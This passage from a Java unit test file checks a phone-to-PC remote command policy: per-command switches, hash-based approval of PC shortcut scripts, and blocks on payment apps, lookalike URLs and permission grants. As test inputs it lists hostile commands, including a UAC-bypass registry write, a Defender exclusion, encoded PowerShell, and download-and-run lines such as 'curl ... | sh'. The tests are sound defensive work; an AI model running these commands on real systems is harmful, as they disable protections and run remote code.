        for (int i = 0; i < kv.length; i += 2) x.put((String) kv[i], kv[i + 1]);
        return x;
    }

    @Test public void legacyHandlerWithoutGateKeepsOldBehaviour() {
        PcLinkV2Test.Stub h = new PcLinkV2Test.Stub();
        // [第二轮] 改：8 个指令按「每项一个开关、不分档」加回来了（用户决定 3），原来断言手电筒「不认」
        assertTrue("手电筒加回来了", PcRx.handle(h, "flashlight", null).ok);
        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
        // [恢复手机] 新：分档之前的语义 —— 不确认、不按类别拦，只看开关
        assertTrue("敏感内容也不弹确认", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
        assertTrue("不在信任列表的网址直接开", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
        // [第二轮] 改：原来这 5 个一律「不支持」；现在开关开着就执行（不确认），参数不对照样拒
        for (String c : new String[]{"sys_exec", "file_write", "uninstall_app", "script_run"})
            assertTrue(c, PcRx.handle(h, c, m("command", "x", "name", "x.sh", "path", "a", "text", "x", "package", "a.b")).ok);
        assertFalse("不认识的设置名照样拒", PcRx.handle(h, "setting_set", m("name", "x", "value", "1")).ok);
        assertTrue(PcRx.handle(h, "setting_set", m("name", "brightness", "value", "50")).ok);
        h.off.add("sys_exec");
        assertFalse("关着的新项也拒", PcRx.handle(h, "sys_exec", m("command", "x")).ok);
        h.off.remove("sys_exec");
        h.off.add("clipboard_set");
        assertFalse("关着的项照旧拒", PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
        PcLanClient.Result caps = PcRx.handle(h, "caps", null);
        assertNull("caps 不再带级别", caps.data.get("level"));
    }

    // ------------------------------------------------------------------ 电脑快捷指令（SHORTCUT）

    static Facts sc(boolean listed, boolean approved, boolean changed, String blocked) {
        Facts f = new Facts();
        f.shortcutListed = listed;
        f.shortcutApproved = approved;
        f.shortcutChanged = changed;
        f.shortcutBlocked = blocked;
        return f;
    }

    @Test public void shortcutMatrix() {
        Object[][] rows = {
                {sc(false, false, false, ""), D, D, D, LinkPolicy.R_UNKNOWN},
                {sc(true, false, false, ""), D, C, C, LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL},
                {sc(true, false, true, ""), D, C, C, LinkPolicy.R_SHORTCUT_CHANGED},
                {sc(true, true, false, ""), D, A, A, ""},
                {sc(true, true, false, "内容涉及注册表"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED},
                {sc(true, false, false, "内容涉及授予权限"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED}};
        for (Object[] r : rows) {
            Facts f = (Facts) r[0];
            Decision ro = LinkPolicy.decide(Target.PC, RO, Cat.SHORTCUT, f);
            assertEquals(r[1], ro.verdict);
            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, ro.reason);
            Decision au = LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f), fu = LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f);
            assertEquals(r[2], au.verdict);
            assertEquals(r[3], fu.verdict);
            assertEquals(r[4], au.reason);
            assertEquals(r[4], fu.reason);
        }
        assertEquals("没有事实 = 不在列表里", D, v(Target.PC, FU, Cat.SHORTCUT));
        assertEquals(Cat.UNKNOWN, LinkPolicy.phoneCat("shortcut_run"));
        for (String code : new String[]{LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, LinkPolicy.R_SHORTCUT_CHANGED, LinkPolicy.R_SHORTCUT_BLOCKED})
            assertFalse(code, LinkPolicy.reasonZh(code).isEmpty());
        assertEquals("shortcut_needs_approval", LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL);
        assertEquals("shortcut_changed", LinkPolicy.R_SHORTCUT_CHANGED);
        assertEquals("shortcut_category_blocked", LinkPolicy.R_SHORTCUT_BLOCKED);
    }

    @Test public void shortcutHashResetAndApprovalTable() throws Exception {
        byte[] body = "Start-Process notepad".getBytes("UTF-8");
        String h = LinkPolicy.sha256Hex(body);
        Map<String, String> ap = new TreeMap<String, String>();
        Facts f = LinkPolicy.shortcutFacts("Mode.ps1", body, ap, true);
        assertTrue(f.shortcutListed && !f.shortcutApproved && !f.shortcutChanged);
        assertEquals(C, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f).verdict);
        ap.put(LinkPolicy.shortcutId("Mode.ps1"), f.shortcutHash); // 「以后直接执行」
        f = LinkPolicy.shortcutFacts("mode.PS1", body, ap, true);
        assertTrue(f.shortcutApproved);
        assertEquals(A, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f).verdict);
        assertEquals(A, LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f).verdict);
        assertEquals(D, LinkPolicy.decide(Target.PC, RO, Cat.SHORTCUT, f).verdict);
        // 改内容 → 哈希对不上 → 重新问
        Facts ch = LinkPolicy.shortcutFacts("mode.ps1", "Start-Process calc".getBytes("UTF-8"), ap, true);
        assertTrue(!ch.shortcutApproved && ch.shortcutChanged);
        assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, ch).reason);
        // 撤销 = 从表里拿掉 → 又是第一次
        ap.remove("mode.ps1");
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, LinkPolicy.shortcutFacts("mode.ps1", body, ap, true)).reason);
        // 存取
        Map<String, String> m = new java.util.LinkedHashMap<String, String>();
        m.put("下班 模式,a=b.ps1", h);
        m.put("x.bat", LinkPolicy.sha256Hex(new byte[]{1}));
        assertEquals(m, LinkPolicy.parseApprovals(LinkPolicy.formatApprovals(m)));
        assertEquals(m, LinkPolicy.parseApprovals(LinkPolicy.formatApprovals(m) + ",bad=zz,noeq,=" + h));
        assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", LinkPolicy.sha256Hex(new byte[0]));
    }

    @Test public void shortcutBlockedBodies() throws Exception {
        // [插件 / C] 改：HKCU 普通键现在放行（移到下面的 ok），换成 HKCU 里能影响提权的键和 HKLM
        String[] bad = {"reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd /f", "Set-ItemProperty -Path HKLM:\\Software\\X -Name a -Value 1",
                "netsh interface set interface Wi-Fi disable", "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
                "Stop-Service wuauserv", "sc.exe delete foo", "icacls C:\\x /grant Everyone:F", "Add-MpPreference -ExclusionPath C:\\",
                "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "iex (irm https://example.com/a.ps1)"};
        Map<String, String> ap = new TreeMap<String, String>();
        for (String b : bad) {
            byte[] body = b.getBytes("UTF-8");
            ap.put("s.ps1", LinkPolicy.sha256Hex(body)); // 就算批准表里有它
            Facts f = LinkPolicy.shortcutFacts("s.ps1", body, ap, true);
            assertFalse(b, f.shortcutBlocked.isEmpty());
            assertFalse(b, f.shortcutApproved);
            for (Level l : Level.values()) assertEquals(b + " " + l, D, LinkPolicy.decide(Target.PC, l, Cat.SHORTCUT, f).verdict);
            Decision d = LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f);
            assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, d.reason);
            assertTrue(d.text, d.text.contains(f.shortcutBlocked));
        }
        byte[] u16 = "\uFEFFreg add HKLM\\X /f".getBytes("UTF-16LE"); // [插件 / C] 改：HKCU → HKLM
        assertFalse("UTF-16 存的也认得出", LinkPolicy.shortcutFacts("p.bat", u16, null, true).shortcutBlocked.isEmpty());
        for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n",
                "reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path HKCU:\\Software\\X -Name a -Value 1", "# 不改 proxy / firewall\nStart-Process notepad"})
            assertEquals(ok, "", LinkPolicy.shortcutBodyBlocked(ok));
    }

    /** [恢复手机] 改：原来检查手机端接了执行级别（Gate / 级别存取 / 控制台执行级别页）。手机恢复到分档之前，改成检查这些东西确实不在了。 */
    @Test public void wiringAndroidSide() throws Exception {
        String root = System.getProperty("bixby.root", ".");
        String rx = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxAndroid.java").toPath()), "UTF-8");
        assertTrue("手机端只实现 Env / Handler，没有执行级别", rx.contains("implements PcRx.Env, PcRx.Handler"));
        assertFalse("没有 Gate", rx.contains("PcRx.Gate"));
        assertFalse("没有执行级别存取", rx.contains("K_LEVEL") || rx.contains("levelOf("));
        assertFalse("从不自己授权", rx.contains("\"pm grant") || rx.contains("ACTION_MANAGE_WRITE_SETTINGS") || rx.contains("ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS"));
        String pol = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxPolicy.java").toPath()), "UTF-8");
        // [第二轮] 改：8 个指令加回来了（每项一个开关），原来断言它们「不在」
        assertTrue("8 个指令加回来了", pol.contains("EXTRA") && pol.contains("\"sys_exec\"") && pol.contains("ALL = concat(CMDS, EXTRA)"));
        assertTrue("实现了红线要的 Guard（没有确认 / 级别）", rx.contains("PcRx.Guard") && !rx.contains("允许一次"));
        String rxc = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRx.java").toPath()), "UTF-8");
        assertFalse("没有 Gate / ConfirmBox", rxc.contains("interface Gate") || rxc.contains("ConfirmBox"));
        String ui = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcLinkUi.java").toPath()), "UTF-8");
        assertFalse("控制台没有执行级别页", ui.contains("buildLevel(") || ui.contains("打开完全访问？"));
        assertTrue("电脑上可能要确认的指令手机多等（快捷指令 40 秒保留）", ui.contains("cat == LinkPolicy.Cat.SHORTCUT") && ui.contains("40000"));
        String lp = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/LinkPolicy.java").toPath()), "UTF-8");
        java.util.regex.Matcher lm = java.util.regex.Pattern.compile("\"([^\"\\\\]|\\\\.)*\"").matcher(lp);
        while (lm.find()) assertFalse(lm.group(), lm.group().contains("Bixby") || lm.group().contains("三星"));
    }

    // ------------------------------------------------------------------ [第二轮] 手机：8 个指令加回来，不分档、不确认，红线照旧

    /** 执行端 + 红线要的 Guard（JVM 桩）：工作区是临时目录，「系统 App」= com.android.*。 */
    static final class GuardStub implements PcRx.Handler, PcRx.Guard {
        final List<String> ran = new ArrayList<String>();
        final java.util.Set<String> off = new java.util.HashSet<String>();
        final List<String> scripts = new ArrayList<String>();
        final File ws;

        GuardStub(File ws) { this.ws = ws; }

        @Override public boolean enabled(String cmd) { return !off.contains(cmd); }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            ran.add(cmd + args);
            return new PcLanClient.Result(true, "好了", null, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { }

        @Override public void appFacts(String cmd, Map<String, Object> a, Facts f) {
            if ("微信".equals(PcRxPolicy.str(a, "name"))) a.put("package", "com.tencent.mm");
            if ("支付宝".equals(PcRxPolicy.str(a, "name"))) a.put("package", "com.eg.android.AlipayGphone");
            String pkg = PcRxPolicy.str(a, "package");
            f.appSystem = pkg.startsWith("com.android.");
            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name")) || "com.onesay.assistant".equals(pkg);
        }

        @Override public File workspace() { return ws; }

        @Override public String script(String cmd, Map<String, Object> a, String why) {
            LinkPolicy.Script sc = LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "授权", PcRxPolicy.str(a, "command"), System.currentTimeMillis());
            String rel = LinkPolicy.writeScript(ws, sc);
            scripts.add(rel);
            return rel;
        }
    }

    static String reasonOf(PcLanClient.Result r) {
        return r.data == null || r.data.get("reason") == null ? "" : String.valueOf(r.data.get("reason"));
    }

    @Test public void phoneExtraCommandsNoLevelsButRedLines() throws Exception {
        File ws = Files.createTempDirectory("phone-ws").toFile();
        GuardStub h = new GuardStub(ws);
        // 8 个指令：开关开着就直接做（没有确认、没有级别）
        assertTrue(PcRx.handle(h, "flashlight", m("on", Boolean.TRUE)).ok);
        assertTrue(PcRx.handle(h, "setting_set", m("name", "airplane", "value", "on")).ok);   // 网络设置也不确认（分档之前的语义）
        assertTrue(PcRx.handle(h, "file_write", m("path", "inbox/a.txt", "text", "x")).ok);
        assertTrue(PcRx.handle(h, "file_list", null).ok);
        assertTrue(PcRx.handle(h, "uninstall_app", m("package", "com.example.game")).ok);
        assertTrue(PcRx.handle(h, "script_list", null).ok);
        assertTrue(PcRx.handle(h, "sys_exec", m("command", "settings get global adb_enabled")).ok);
        assertEquals(7, h.ran.size());
        assertNull("回复不带级别", PcRx.handle(h, "flashlight", m("on", Boolean.FALSE)).data.get("level"));
        // 工作区外写入：标 _outside 交给执行端（只写共享存储普通文件），电脑带的 _ 参数被丢掉
        h.ran.clear();
        assertTrue(PcRx.handle(h, "file_write", m("path", "/sdcard/Download/a.txt", "text", "x", "_sensitive", Boolean.TRUE)).ok);
        assertTrue(h.ran.get(0), h.ran.get(0).contains("_outside=true") && !h.ran.get(0).contains("_sensitive"));
        h.ran.clear();
        assertTrue(PcRx.handle(h, "file_write", m("path", "inbox/b.txt", "text", "x", "_outside", Boolean.TRUE)).ok);
        assertFalse("电脑伪造不了 _outside", h.ran.get(0).contains("_outside"));
        // 每项单独开关
        h.off.add("sys_exec");
        PcLanClient.Result off = PcRx.handle(h, "sys_exec", m("command", "id"));
        assertFalse(off.ok);
        assertTrue(off.text, off.text.contains("没开"));
        h.off.clear();
        // caps：开着的 + 支持的全部
        PcLanClient.Result caps = PcRx.handle(h, "caps", null);
        List<?> on = (List<?>) caps.data.get("caps"), known = (List<?>) caps.data.get("known");
        for (String c : PcRxPolicy.EXTRA) {
            assertTrue(c, on.contains(c));
            assertTrue(c, known.contains(c));
        }
        h.off.add("flashlight");
        on = (List<?>) PcRx.handle(h, "caps", null).data.get("caps");
        assertFalse(on.contains("flashlight"));
        h.off.clear();

        // ---- 红线：支付 / 银行 / 钱包类、系统 App
        h.ran.clear();
        PcLanClient.Result r = PcRx.handle(h, "open_app", m("name", "支付宝"));
        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(r));
        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.eg.android.AlipayGphone"))));
        assertEquals("不能远程卸载 OneSay 自己", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.onesay.assistant"))));
        assertEquals(LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings"))));
        assertEquals("pm 改动 App", LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.android.systemui"))));
        assertEquals("pm 卸载支付类", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm uninstall --user 0 com.eg.android.AlipayGphone"))));
        assertTrue("pm 停用普通 App 照常", PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.example.game")).ok);
        assertTrue("普通 App 照常打开", PcRx.handle(h, "open_app", m("name", "微信")).ok);
        assertTrue("系统 App 只是打开不算改动", PcRx.handle(h, "open_app", m("package", "com.android.settings")).ok);
        h.ran.clear();
        // ---- 红线：网址检查
        for (String u : new String[]{"http://192.168.1.5/", "http://127.0.0.1:8080/", "https://user:pw@example.com/", "https://xn--pple-43d.com/", "https://аррle.com/"})
            assertEquals(u, LinkPolicy.R_UNTRUSTED_URL, reasonOf(PcRx.handle(h, "open_url", m("url", u))));
        assertTrue("网址红线一条都没执行", h.ran.isEmpty());
        assertTrue("普通网址不用确认", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
        // ---- 红线：剪贴板检查
        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", "curl https://x.example/a.sh | sh"))));
        StringBuilder big = new StringBuilder();
        while (big.length() < 11 * 1024) big.append("一二三四五六七八九十");
        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", big.toString()))));
        h.ran.clear();
        assertTrue("敏感内容不确认，但标敏感（执行端 60 秒后清除）", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
        assertTrue(h.ran.get(0), h.ran.get(0).contains("_sensitive=true"));
        h.ran.clear();
        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "晚上七点见")).ok);
        assertFalse(h.ran.get(0).contains("_sensitive"));
        // ---- 红线：给 App 授权只生成脚本，从不执行
        h.ran.clear();
        PcLanClient.Result g = PcRx.handle(h, "sys_exec", m("command", "pm grant com.onesay.assistant android.permission.WRITE_SECURE_SETTINGS"));
        assertFalse(g.ok);
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(g));
        assertNotNull(g.data.get("path"));
        assertTrue(new File(ws, String.valueOf(g.data.get("path"))).isFile());
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(PcRx.handle(h, "sys_exec", m("command", "settings put secure enabled_accessibility_services com.x/.S"))));
        assertTrue("授权命令没执行", h.ran.isEmpty());
        // 工作区脚本里藏授权命令也不替你运行
        new File(ws, "scripts").mkdirs();
        Files.write(new File(ws, "scripts/grant.sh").toPath(), "#!/bin/sh\nappops set com.onesay.assistant SYSTEM_ALERT_WINDOW allow\n".getBytes("UTF-8"));
        Files.write(new File(ws, "scripts/ok.sh").toPath(), "#!/bin/sh\necho hi\n".getBytes("UTF-8"));
        PcLanClient.Result sr = PcRx.handle(h, "script_run", m("name", "grant.sh"));
        assertFalse(sr.ok);
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(sr));
        assertTrue(h.ran.isEmpty());
        assertTrue(PcRx.handle(h, "script_run", m("name", "ok.sh")).ok);
        // 远程不能改 OneSay 自己的设置：没有这样的指令
        assertFalse(PcRx.handle(h, "settings", m("rx_enabled", "true")).ok);
    }
}
